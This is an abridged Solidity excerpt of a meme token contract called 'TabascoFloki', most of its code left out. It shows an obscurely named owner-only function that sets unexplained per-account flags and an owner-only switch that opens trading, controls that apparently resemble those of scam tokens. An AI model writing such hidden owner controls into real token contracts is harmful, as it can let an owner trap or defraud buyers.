...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _Milk(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function Tabasco() external onlyOwner() {
        _openTrading = true;
    }
}

contract ERC20Tabasco is Context, ERC20 {
    constructor(
...
contract TabascoFloki is ERC20Tabasco {
    constructor() ERC20Tabasco("TabascoFloki", "TABASCO", false, true, 1100, 25, msg.sender, 10000000000 * 10 ** 18, msg.sender, 1) {
    }
}